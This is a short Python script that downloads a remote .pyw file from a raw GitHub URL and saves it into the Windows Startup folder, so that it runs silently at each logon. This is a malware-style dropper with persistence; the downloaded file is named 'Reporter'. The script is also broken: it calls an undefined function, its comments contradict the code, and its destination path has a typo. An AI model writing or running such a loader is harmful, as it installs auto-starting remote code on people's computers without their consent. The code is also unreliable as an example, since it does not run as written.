import requests
import subprocess
import os
import time

time.sleep(0)
def download_webpage(url, filename):
    try:
        # Fetch the webpage content
        response = requests.get(url)
        if response.status_code == 200:
            # Get the content of the webpage
            content = response.text
            
            # Get the path to the startup folder
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup')
            
            # Ensure filename has .py extension
            if not filename.endswith('.pyw'):
                filename += '.pyw'
            
            # Create the file path
            file_path = os.path.join(startup_folder, filename)
            
            # Write the webpage content to a .py file
            with open(file_path, 'w') as f:
                f.write(content)
                
            print(f"Webpage content downloaded and saved as '{filename}' in the startup folder.")
        else:
            print(f"Failed to download webpage. Status code: {response.status_code}")
    except Exception as e:
        print(f"An error occurred: {e}")

    # Replace the URL with the URL of the .pyw file you want to download
file_url = "https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.pyw"
    
    # Replace the destination path with the path where you want to save the .pyw file
destination_path = r"C:\WINJV\Storage\Reporter.pwy"
    
    # Download and open the .pyw file
download_and_open_file(file_url, destination_path)
